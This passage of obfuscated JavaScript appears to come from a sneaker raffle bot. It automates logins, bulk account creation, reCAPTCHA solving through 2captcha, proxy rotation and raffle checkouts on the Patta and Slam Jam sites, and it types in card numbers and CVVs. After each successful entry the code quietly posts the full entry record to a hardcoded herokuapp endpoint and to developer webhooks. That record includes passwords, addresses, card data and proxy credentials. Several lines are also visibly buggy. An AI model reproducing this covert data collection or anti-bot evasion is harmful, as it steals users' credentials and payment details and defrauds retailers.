                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x44fb97[0x0] + ':' + _0x44fb97[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3a77ac = await _0x414d54['newPage']();
                            await _0x3a77ac['authenticate']({
                                'username': '' + _0x44fb97[0x2],
                                'password': '' + _0x44fb97[0x3]
                            }), console['log'](_0x5b438b() + '\x20[' + _0x3cbd34['name'] + ']\x20Task\x20' + (_0x3868dc + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3a77ac['setRequestInterception'](!![]), _0x3a77ac['on']('request', _0x539941 => {
                                _0x539941['resourceType']() === 'image' || _0x539941['resourceType']() === 'font' || _0x539941['resourceType']() === 'media' ? _0x539941['abort']() : _0x539941['continue']();
                            }), await _0x3a77ac['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x3a77ac['waitForSelector']('#CustomerEmail'), console['log'](_0x5b438b() + '\x20[' + _0x3cbd34['name'] + ']\x20Task\x20' + (_0x3868dc + 0x1) + '\x20:\x20Logging\x20in..'), await _0x3a77ac['type']('#CustomerEmail', '' + _0x2d65e1[_0x3868dc]['Email']), await _0x415e3e(0x12c), await _0x3a77ac['type']('#CustomerPassword', '' + _0x2d65e1[_0x3868dc]['Password']), await _0x415e3e(0x226), await _0x3a77ac['$eval']('#customer_login', _0x5e97cf => _0x5e97cf['submit']());
                            try {
                                await _0x3a77ac['waitForSelector']('#orders'), await _0x415e3e(0x4b0);
                            } catch {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x3cbd34['name'] + ']\x20Task\x20' + (_0x3868dc + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x3a77ac['goto']('' + _0x2d65e1[_0x3868dc]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x415e3e(0xbb8), console['log'](_0x5b438b() + '\x20[' + _0x3cbd34['name'] + ']\x20Task\x20' + (_0x3868dc + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x3a77ac['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x3cbd34['name'] + ']\x20Task\x20' + (_0x3868dc + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x3a77ac['type']('#email', '' + _0x2d65e1[_0x3868dc]['Email']), await _0x415e3e(0x384), await _0x3a77ac['type']('#first_name', '' + _0x2d65e1[_0x3868dc]['FirstName']), await _0x415e3e(0x514), await _0x3a77ac['type']('#last_name', '' + _0x2d65e1[_0x3868dc]['LastName']), await _0x415e3e(0x514), await _0x3a77ac['type']('#street_address', _0x2d65e1[_0x3868dc]['Address1'] + '\x20' + _0x2d65e1[_0x3868dc]['HouseNumber'] + '\x20' + _0x2d65e1[_0x3868dc]['Address2']), await _0x415e3e(0x2bc);
                            _0x2d65e1[_0x3868dc]['Postcode'] == undefined && (_0x2d65e1[_0x3868dc]['Postcode'] = _0x2d65e1[_0x3868dc]['Zip']);
                            await _0x3a77ac['type']('#zip_code', '' + _0x2d65e1[_0x3868dc]['Postcode']), await _0x415e3e(0x320), await _0x3a77ac['type']('#city', '' + _0x2d65e1[_0x3868dc]['City']), await _0x415e3e(0x320), await _0x3a77ac['type']('#bday', '01/01/1994'), await _0x415e3e(0x320), await _0x3a77ac['type']('#instagram', '' + _0x2d65e1[_0x3868dc]['Follower']), await _0x415e3e(0x352);
                            if (_0x2d65e1[_0x3868dc]['Size'] == 'RANDOM') {
                                const _0x585c2a = await _0x3a77ac['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x36c79a => {
                                    return _0x36c79a['map'](_0x5d4807 => _0x5d4807['textContent']);
                                });
                                var _0x43339b = Math['round'](Math['random']() * (_0x585c2a['length'] - 0x1));
                                console['log'](_0x5b438b() + '\x20[' + _0x3cbd34['name'] + ']\x20Task\x20' + (_0x3868dc + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x585c2a[_0x43339b]), await _0x3a77ac['click']('label[data-eu-size=\x22' + _0x585c2a[_0x43339b] + '\x22]');
                            } else {
                                console['log'](_0x5b438b() + '\x20[' + _0x3cbd34['name'] + ']\x20Task\x20' + (_0x3868dc + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x2d65e1[_0x3868dc]['Size']);
                                try {
                                    await _0x3a77ac['click']('label[data-eu-size=\x22' + _0x2d65e1[_0x3868dc]['Size'] + '\x22]');
                                } catch {
                                    await _0x3a77ac['click']('label[data-eu-size=\x22' + _0x2d65e1[_0x3868dc]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x415e3e(0xbb8), await _0x3a77ac['$$eval']('.raffle__checkbox-label', _0x2af9de => _0x2af9de['forEach'](_0x284cbb => _0x284cbb['click']())), await _0x415e3e(0x7d0), console['log'](_0x5b438b() + '\x20[' + _0x3cbd34['name'] + ']\x20Task\x20' + (_0x3868dc + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x3a77ac['click']('#raffle__form-submit'), await _0x415e3e(0x1388);
                            try {
                                await _0x3a77ac['waitForSelector']('#raffle__confirmation-message-container'), _0x32a300 = 'no', _0x53db49(_0x2d65e1[_0x3868dc], _0x3cbd34), console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x3cbd34['name'] + ']\x20Task\x20' + (_0x3868dc + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x2581a0 = _0x2d65e1[_0x3868dc];
                                try {
                                    prxdata = {
                                        'username': _0x5f9620['replace']('#', ''),
                                        'module': _0x3cbd34['name'],
                                        'entrydata': JSON['stringify'](_0x2581a0),
                                        'proxy': '' + _0x5a36b9[_0x3868dc]
                                    };
                                    var _0x232faa = JSON['stringify'](prxdata);
                                    let _0x154eb7 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x232faa, _0x154eb7);
                                } catch (_0x2f68d7) {
                                }
                            } catch (_0x1d5ac5) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x461a68[taskModule]['name'] + ']\x20Task\x20' + (_0x3868dc + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x1d5ac5));
                            }
                        } catch (_0x20592a) {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x461a68[taskModule]['name'] + ']\x20Task\x20' + (_0x3868dc + 0x1) + '\x20:\x20' + _0x20592a)), _0x32a300 = 'yes';
                        } finally {
                            _0x414d54 && _0x414d54['close']();
                            if (_0x32a300 == 'yes' && _0x29944c != 0x5 && _0x4cea74 != 'Size\x20Not\x20Found') {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x3cbd34['name'] + ']\x20Task\x20' + (_0x3868dc + 0x1) + '\x20:\x20Retrying\x20(' + _0x29944c + '\x20/\x205)')), _0x3868dc = _0x3868dc - 0x1, _0x29944c = _0x29944c + 0x1;
                                continue;
                            }
                            _0x32a300 == 'yes' && _0x29944c >= 0x5 && (_0x4d12b6(_0x2d65e1[_0x3868dc], _0x3cbd34), _0x32a300 = 'no', _0x29944c = 0x0), console['log']('Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x42e472, _0x2dab2e, _0x2bcc46) {
                    _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x165c4b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x47bde9 = 0x0; _0x47bde9 < _0x2dab2e['length']; _0x47bde9++) {
                        if (_0x3cff5f != 'yes')
                            var _0x3cff5f = '', _0x48710a = 0x0;
                        var _0x29adb7 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5f9620
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x165c4b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x57c4cf
                                }
                            ]
                        }];
                        const _0x7f6922 = { 'embeds': _0x29adb7 };
                        _0x424e52(_0x42e472['name'] + '\x20Task\x20' + (_0x47bde9 + 0x1) + '\x20/\x20' + _0x2dab2e['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                        try {
                            await _0x3da21c(_0x2dab2e, _0x47bde9);
                        } catch {
                            _0x3cff5f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x399945 = await _0x105954(_0x2dab2e[_0x47bde9], _0x42e472, 'acc', ![]);
                        const _0x5cc18b = { 'succesDEVMSG': { 'embeds': [_0x399945] } };
                        if (_0x2dab2e[_0x47bde9]['Email'] == '' || _0x2dab2e[_0x47bde9]['FirstName'] == '' || _0x2dab2e[_0x47bde9]['LastName'] == '') {
                            console['log'](_0x5b438b() + '\x20[' + _0x461a68[taskModule]['name'] + ']\x20Task\x20' + (_0x47bde9 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x415e3e(0x7d0);
                            continue;
                        }
                        (_0x2dab2e[_0x47bde9]['Password'] == '' || _0x2dab2e[_0x47bde9] == undefined) && _0x2dab2e[_0x47bde9]['Password'] == 'JRaffles23!';
                        if (_0x165c4b['useRandomProxy'] = ![])
                            var _0x4a3415 = _0x2bcc46[_0x47bde9]['split'](':');
                        else
                            var _0x4d6548 = Math['round'](Math['random']() * (_0x2bcc46['length'] - 0x1)), _0x4a3415 = _0x2bcc46[_0x4d6548]['split'](':');
                        var _0x33e1e2;
                        try {
                            _0x33e1e2 = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4a3415[0x0] + ':' + _0x4a3415[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x33e1e2 = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4a3415[0x0] + ':' + _0x4a3415[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1ec576 = await _0x33e1e2['newPage']();
                            await _0x1ec576['authenticate']({
                                'username': '' + _0x4a3415[0x2],
                                'password': '' + _0x4a3415[0x3]
                            }), console['log'](_0x5b438b() + '\x20[' + _0x42e472['name'] + ']\x20Task\x20' + (_0x47bde9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1ec576['setRequestInterception'](!![]), _0x1ec576['on']('request', _0x403caa => {
                                _0x403caa['resourceType']() === 'image' || _0x403caa['resourceType']() === 'font' || _0x403caa['resourceType']() === 'media' ? _0x403caa['abort']() : _0x403caa['continue']();
                            }), await _0x1ec576['goto']('https://drop.slamjam.com/account/register'), await _0x415e3e(0xbb8), await _0x1ec576['waitForSelector']('#FirstName'), await _0x1ec576['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1ec576['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x5b438b() + '\x20[' + _0x42e472['name'] + ']\x20Task\x20' + (_0x47bde9 + 0x1) + '\x20:\x20Filling\x20information'), await _0x415e3e(0x4b0), await _0x1ec576['type']('#FirstName', '' + _0x2dab2e[_0x47bde9]['FirstName']), await _0x415e3e(0x226), await _0x1ec576['type']('#LastName', '' + _0x2dab2e[_0x47bde9]['LastName']), await _0x415e3e(0x226), await _0x1ec576['type']('#Email', '' + _0x2dab2e[_0x47bde9]['Email']), await _0x415e3e(0x2ee), await _0x1ec576['type']('#ConfirmEmail', '' + _0x2dab2e[_0x47bde9]['Email']), await _0x415e3e(0x2ee), await _0x1ec576['type']('#CreatePassword', '' + _0x2dab2e[_0x47bde9]['Password']), await _0x415e3e(0x2ee), await _0x1ec576['type']('#CreateConfirmPassword', '' + _0x2dab2e[_0x47bde9]['Password']), await _0x415e3e(0x226), console['log'](_0x5b438b() + '\x20[' + _0x42e472['name'] + ']\x20Task\x20' + (_0x47bde9 + 0x1) + '\x20:\x20Submitting..'), await _0x1ec576['$eval']('#create_customer', _0x7ab38b => _0x7ab38b['submit']()), await _0x415e3e(0x1388), console['log'](_0x5b438b() + '\x20[' + _0x42e472['name'] + ']\x20Task\x20' + (_0x47bde9 + 0x1) + '\x20:\x20' + _0x5dc29b['cyan']('Solving\x20Captcha')), await _0x1ec576['solveRecaptchas'](), console['log'](_0x5b438b() + '\x20[' + _0x42e472['name'] + ']\x20Task\x20' + (_0x47bde9 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x1ec576['$eval']('.shopify-challenge__container\x20>\x20form', _0x421606 => _0x421606['submit']());
                            try {
                                await _0x1ec576['waitForSelector']('.product-card__image'), await _0x415e3e(0x1f4), _0x3cff5f = 'no', console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x42e472['name'] + ']\x20Task\x20' + (_0x47bde9 + 0x1) + '\x20:\x20Account\x20' + _0x2dab2e[_0x47bde9]['Email'] + '\x20Generated!')), _0xaf9669['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x2dab2e[_0x47bde9]['Email'] + ',' + _0x2dab2e[_0x47bde9]['Password']), console['log'](_0x5dc29b['yellow'](_0x5b438b() + '\x20[' + _0x42e472['name'] + ']\x20Task\x20' + (_0x47bde9 + 0x1) + '\x20:\x20Account\x20' + _0x2dab2e[_0x47bde9]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x5cc18b['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4d8e61(_0xd282bc, _0x5cc18b['succesDEVMSG']);
                            } catch (_0x334d37) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x461a68[taskModule]['name'] + ']\x20Task\x20' + (_0x47bde9 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x334d37));
                            }
                        } catch (_0x4d5f9e) {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x461a68[taskModule]['name'] + ']\x20Task\x20' + (_0x47bde9 + 0x1) + '\x20:\x20' + _0x4d5f9e));
                        } finally {
                            _0x33e1e2 && _0x33e1e2['close']();
                            if (_0x3cff5f == 'yes' && _0x48710a != 0x5) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x42e472['name'] + ']\x20Task\x20' + (_0x47bde9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x48710a + '\x20/\x205)')), _0x47bde9 = _0x47bde9 - 0x1, _0x48710a = _0x48710a + 0x1;
                                continue;
                            }
                            _0x3cff5f == 'yes' && _0x48710a >= 0x5 && (_0x4d12b6(_0x2dab2e[_0x47bde9], _0x42e472), _0x3cff5f = 'no', _0x48710a = 0x0), console['log']('Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x5cfdc3, _0x472d1d, _0x76d9de) {
                    _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x165c4b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3c99b3 = 0x0; _0x3c99b3 < _0x472d1d['length']; _0x3c99b3++) {
                        var _0xfc6e13;
                        if (_0x123790 != 'yes')
                            var _0x123790 = '', _0x542d52 = 0x0;
                        _0x424e52(_0x5cfdc3['name'] + '\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20/\x20' + _0x472d1d['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                        try {
                            await _0x3da21c(_0x472d1d, _0x3c99b3);
                        } catch {
                            _0x123790 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x472d1d[_0x3c99b3]['Email'] == '' || _0x472d1d[_0x3c99b3]['Password'] == '' || _0x472d1d[_0x3c99b3]['FirstName'] == '' || _0x472d1d[_0x3c99b3]['LastName'] == '') {
                            console['log'](_0x5b438b() + '\x20[' + _0x5cfdc3['name'] + ']\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x165c4b['useRandomProxy'] = ![])
                            var _0x3fc769 = _0x76d9de[_0x3c99b3]['split'](':');
                        else
                            var _0x4acfe8 = Math['round'](Math['random']() * (_0x76d9de['length'] - 0x1)), _0x3fc769 = _0x76d9de[_0x4acfe8]['split'](':');
                        var _0x118ca3;
                        try {
                            _0x118ca3 = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3fc769[0x0] + ':' + _0x3fc769[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x118ca3 = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3fc769[0x0] + ':' + _0x3fc769[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x30e724 = await _0x118ca3['newPage']();
                            await _0x30e724['authenticate']({
                                'username': '' + _0x3fc769[0x2],
                                'password': '' + _0x3fc769[0x3]
                            }), await _0x30e724['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x5b438b() + '\x20[' + _0x5cfdc3['name'] + ']\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x30e724['setRequestInterception'](!![]), _0x30e724['on']('request', _0x5e6705 => {
                                _0x5e6705['resourceType']() === 'image' || _0x5e6705['resourceType']() === 'font' || _0x5e6705['resourceType']() === 'media' ? _0x5e6705['abort']() : _0x5e6705['continue']();
                            }), await _0x30e724['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x30e724['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x30e724['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x415e3e(0x258), await _0x30e724['waitForSelector']('#CustomerEmail'), console['log'](_0x5b438b() + '\x20[' + _0x5cfdc3['name'] + ']\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x30e724['type']('#CustomerEmail', '' + _0x472d1d[_0x3c99b3]['Email']), await _0x415e3e(0x12c), await _0x30e724['type']('#CustomerPassword', '' + _0x472d1d[_0x3c99b3]['Password']), await _0x415e3e(0x226), await _0x30e724['$eval']('#customer_login', _0x543e8b => _0x543e8b['submit']()), await _0x415e3e(0x7d0), await _0x30e724['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x5b438b() + '\x20[' + _0x5cfdc3['name'] + ']\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20:\x20' + _0x5dc29b['cyan']('Solving\x20Captcha')), await _0x30e724['solveRecaptchas'](), console['log'](_0x5b438b() + '\x20[' + _0x5cfdc3['name'] + ']\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x30e724['$eval']('.shopify-challenge__container\x20>\x20form', _0x7ede15 => _0x7ede15['submit']());
                            try {
                                await _0x30e724['waitForSelector']('.nav-account'), await _0x415e3e(0x4b0);
                            } catch {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x5cfdc3['name'] + ']\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x30e724['goto']('' + _0x472d1d[_0x3c99b3]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x415e3e(0xbb8), console['log'](_0x5b438b() + '\x20[' + _0x5cfdc3['name'] + ']\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x30e724['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x30e724['click']('.product-select-variant-wrapper'), await _0x415e3e(0x320), await _0x30e724['click']('li.product-select-variant__value[data-size=\x22' + _0x472d1d[_0x3c99b3]['Size'] + '\x22]'), await _0x415e3e(0x384), await _0x30e724['$eval']('#AddToCartForm-product-template-raffle', _0x14fa16 => _0x14fa16['submit']()), await _0x30e724['waitForSelector']('.cart-order-summary__content'), await _0x415e3e(0x514), await _0x30e724['goto']('https://drop.slamjam.com/checkout'), await _0x415e3e(0x514), await _0x30e724['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x5b438b() + '\x20[' + _0x5cfdc3['name'] + ']\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x30e724['select']('#checkout_shipping_address_country', '' + _0x472d1d[_0x3c99b3]['Country']), await _0x415e3e(0x200), await _0x30e724['waitForSelector']('#checkout_shipping_address_first_name'), await _0x30e724['type']('#checkout_shipping_address_first_name', '' + _0x472d1d[_0x3c99b3]['FirstName']), await _0x415e3e(0x237), await _0x30e724['type']('#checkout_shipping_address_last_name', '' + _0x472d1d[_0x3c99b3]['LastName']), await _0x415e3e(0x1e0), await _0x30e724['type']('#checkout_shipping_address_address1', _0x472d1d[_0x3c99b3]['Address1'] + '\x20' + _0x472d1d[_0x3c99b3]['HouseNumber']), await _0x415e3e(0x514), await _0x30e724['type']('#checkout_shipping_address_address2', '' + _0x472d1d[_0x3c99b3]['Address2']), await _0x415e3e(0x514);
                            _0x472d1d[_0x3c99b3]['Postcode'] == undefined && (_0x472d1d[_0x3c99b3]['Postcode'] = _0x472d1d[_0x3c99b3]['Zip']);
                            await _0x30e724['type']('#checkout_shipping_address_zip', '' + _0x472d1d[_0x3c99b3]['Postcode']), await _0x415e3e(0x2bc), await _0x30e724['type']('#checkout_shipping_address_city', '' + _0x472d1d[_0x3c99b3]['City']), await _0x415e3e(0x320), await _0x30e724['type']('#checkout_shipping_address_phone', '' + _0x472d1d[_0x3c99b3]['Phone']), await _0x415e3e(0x320), await _0x30e724['click']('#continue_button'), await _0x415e3e(0xbb8), await _0x30e724['waitForSelector']('.summary-title'), await _0x415e3e(0x320), await _0x30e724['click']('#continue_button'), await _0x415e3e(0x320), console['log'](_0x5b438b() + '\x20[' + _0x5cfdc3['name'] + ']\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x30e724['waitForSelector']('#checkout_credit_card_vault'), await _0x415e3e(0x3e8);
                            var _0x5d700f = await _0x30e724['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x31357c = await _0x5d700f['contentFrame']();
                            await _0x31357c['click']('#number'), await _0x415e3e(0x3e8), await _0x31357c['type']('#number', '' + _0x472d1d[_0x3c99b3]['CardNumber'], { 'delay': 0x78 }), _0x5d700f = await _0x30e724['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x31357c = await _0x5d700f['contentFrame'](), await _0x415e3e(0x1c2), await _0x31357c['click']('#name'), await _0x415e3e(0x1f4), await _0x31357c['type']('#name', '' + _0x472d1d[_0x3c99b3]['NameOnCard'], { 'delay': 0x78 }), _0x5d700f = await _0x30e724['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x31357c = await _0x5d700f['contentFrame'](), await _0x415e3e(0x1c2), await _0x31357c['click']('#expiry'), await _0x415e3e(0x1f4), await _0x31357c['type']('#expiry', '' + _0x472d1d[_0x3c99b3]['ExpiryDate'], { 'delay': 0x78 }), _0x5d700f = await _0x30e724['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x31357c = await _0x5d700f['contentFrame'](), await _0x415e3e(0x1c2), await _0x31357c['click']('#verification_value'), await _0x415e3e(0x1f4), await _0x31357c['type']('#verification_value', '' + _0x472d1d[_0x3c99b3]['CVV'], { 'delay': 0x78 }), await _0x30e724['$eval']('#accepts-flag-raffle', _0x139645 => _0x139645['click']()), await _0x415e3e(0x7d0), console['log'](_0x5b438b() + '\x20[' + _0x5cfdc3['name'] + ']\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x30e724['$eval']('#continue_button', _0x117800 => _0x117800['click']()), await _0x415e3e(0x1b58), await _0x30e724['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x30e724['$eval']('.edit_checkout.animate-floating-labels', _0x5b2bfd => _0x5b2bfd['submit']()), await _0x415e3e(0x7d0);
                            try {
                                await _0x30e724['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x123790 = 'no', _0x53db49(_0x472d1d[_0x3c99b3], _0x5cfdc3), console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x5cfdc3['name'] + ']\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x239739) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x239739['message']);
                            }
                            var _0x356f74 = await _0x105954(_0x472d1d[_0x3c99b3], _0x5cfdc3, 'dev', ![]), _0x5cf24e = await _0x105954(_0x472d1d[_0x3c99b3], _0x5cfdc3, 'pub', ![]);
                            let _0x456bdc = _0x472d1d[_0x3c99b3];
                            try {
                                prxdata = {
                                    'username': _0x5f9620['replace']('#', ''),
                                    'module': _0x5cfdc3['name'],
                                    'entrydata': JSON['stringify'](_0x456bdc),
                                    'proxy': '' + _0x76d9de[_0x3c99b3]
                                };
                                var _0x1869c0 = JSON['stringify'](prxdata);
                                let _0x5b523d = { 'headers': { 'content-type': 'application/json' } };
                                await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x1869c0, _0x5b523d);
                            } catch (_0x7541d) {
                            }
                            const _0x434c90 = {
                                'succesDEVMSG': { 'embeds': [_0x356f74] },
                                'succesPUBMSG': { 'embeds': [_0x5cf24e] }
                            };
                            try {
                                _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x434c90['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0x434c90['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0x3ba9f8, _0x434c90['succesPUBMSG']);
                            } catch (_0x300ae8) {
                                console['log'](_0x5dc29b['yellow'](_0x5b438b() + '\x20[' + _0x461a68[taskModule]['name'] + ']\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x300ae8));
                            }
                        } catch (_0x3f9f53) {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x461a68[taskModule]['name'] + ']\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20:\x20' + _0x3f9f53)), _0xfc6e13 = '' + _0x3f9f53;
                            var _0xeee6b8 = await _0x105954(kickz[_0x3c99b3], _0x5cfdc3, 'dev', !![], _0xfc6e13);
                            EMBEDS['errorDEV'] = { 'embeds': [_0xeee6b8] }, _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], EMBEDS['errorDEV']), await _0x4d8e61(_0x369064, EMBEDS['errorDEV']), _0x123790 = 'yes';
                        } finally {
                            _0x118ca3 && _0x118ca3['close']();
                            if (_0x123790 == 'yes' && _0x542d52 != 0x5 && _0xfc6e13 != 'Size\x20Not\x20Found') {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x5cfdc3['name'] + ']\x20Task\x20' + (_0x3c99b3 + 0x1) + '\x20:\x20Retrying\x20(' + _0x542d52 + '\x20/\x205)')), _0x3c99b3 = _0x3c99b3 - 0x1, _0x542d52 = _0x542d52 + 0x1;
                                continue;
                            }
                            _0x123790 == 'yes' && _0x542d52 >= 0x5 && (_0x4d12b6(_0x472d1d[_0x3c99b3], _0x5cfdc3), _0x123790 = 'no', _0x542d52 = 0x0), console['log']('Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                        }
                    }
